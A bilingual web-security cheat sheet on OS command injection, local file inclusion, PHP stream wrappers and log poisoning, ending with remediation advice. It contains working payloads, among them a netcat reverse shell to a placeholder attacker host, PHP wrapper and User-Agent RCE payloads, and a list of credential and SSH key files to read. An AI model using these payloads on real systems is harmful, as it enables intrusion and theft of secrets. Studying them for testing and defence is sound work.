## 1. ⚙️ OS Command Injection

### 🇮🇩 Bahasa Indonesia
**OS Command Injection** terjadi ketika aplikasi mengeksekusi perintah shell sistem operasi (menggunakan fungsi seperti `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()` di PHP, atau `os.system()`, `subprocess.Popen(..., shell=True)` di Python) dengan menggabungkan input pengguna tanpa sanitasi.

```php
// Vulnerable Code:
$ip = $_GET['ip'];
system("ping -c 3 " . $ip);

// Exploit Payload:
http://target.com/ping.php?ip=127.0.0.1;id
```

## 2. 🔀 Shell Command Delimiters & Filter Bypasses

| Delimiter / Operator | Description | Contoh Payload |
|:---|:---|:---|
| `;` | Semicolon: Eksekusi berurutan | `127.0.0.1; cat /etc/passwd` |
| `&&` | AND Logis: Eksekusi jika perintah 1 sukses | `127.0.0.1 && whoami` |
| `\|` | Pipeline: Teruskan output ke perintah 2 | `127.0.0.1 \| uname -a` |
| `\|\|` | OR Logis: Eksekusi jika perintah 1 gagal | `invalid || id` |
| `&` | Background execution | `127.0.0.1 & nc -e /bin/sh attacker 4444` |
| `` `cmd` `` / `$(cmd)` | Command Substitution | `127.0.0.1; echo $(whoami)` |
| `\n` (`%0a`) | Newline: Pemisah baris shell | `127.0.0.1%0aid` |

## 3. 📂 Local File Inclusion (LFI) & Path Traversal

### 🇮🇩 Bahasa Indonesia
**Local File Inclusion (LFI)** terjadi ketika aplikasi menyertakan (*include/require*) file lokal berdasarkan input pengguna. Menggunakan karakter **Path Traversal (`../`)**, penyerang dapat menembus direktori web root untuk membaca file sistem sensitif:

```bash
# ── CRITICAL LINUX TARGET FILES ──────────────────────────────
/etc/passwd                    # User account listing
/etc/shadow                    # Encrypted password hashes (if root)
/etc/hosts                     # Local hostname resolutions
/proc/self/environ             # Process environment variables
/proc/self/cmdline             # Command line arguments of process
/var/log/auth.log              # SSH/Auth log file
/var/log/apache2/access.log    # Web server access log
~/.ssh/id_rsa                  # Private SSH keys
```

## 4. 🧬 PHP Stream Wrappers for LFI

```bash
# ── 1. PHP FILTER (BASE64 SOURCE CODE EXTRACTION) ───────────
# Baca source code PHP tanpa dieksekusi oleh web server
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php

# ── 2. PHP DATA WRAPPER (INSTANT RCE) ────────────────────────
http://target.com/index.php?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id

# ── 3. PHP INPUT WRAPPER ─────────────────────────────────────
POST /index.php?page=php://input HTTP/1.1
Host: target.com

<?php system('id'); ?>
```

## 5. 💥 LFI to Remote Code Execution (RCE) via Log Poisoning

1. Penyerang mengirim request HTTP ke Apache/Nginx dengan payload PHP jahat di dalam header **User-Agent**:
   ```http
   GET /index.php HTTP/1.1
   Host: target.com
   User-Agent: <?php system($_GET['cmd']); ?>
   ```
2. Web server mencatat string tersebut ke `/var/log/apache2/access.log`.
3. Penyerang menyertakan file log tersebut melalui LFI:
   ```
   http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
   ```
4. PHP mengeksekusi kode yang tertanam di file log, menghasilkan **RCE penuh**!

---

## 6. 🛡️ Remediation & Secure Architecture

1. **Avoid Dynamic Shell Execution**: Gunakan fungsi API internal daripada menjalankan shell OS (contoh: gunakan library email daripada memanggil `mailx` lewat `system()`).
2. **Whitelist Approved Files**: Jangan pernah mempercayai nama file dari input user. Gunakan mapping array whitelist:
   ```php
   $allowed = ['home' => 'home.php', 'about' => 'about.php'];
   $page = $allowed[$_GET['page']] ?? 'home.php';
   include($page);
   ```
3. **Disable Dangerous PHP Directives**:
   ```ini
   allow_url_fopen = Off
   allow_url_include = Off
   open_basedir = "/var/www/html/"
   ```
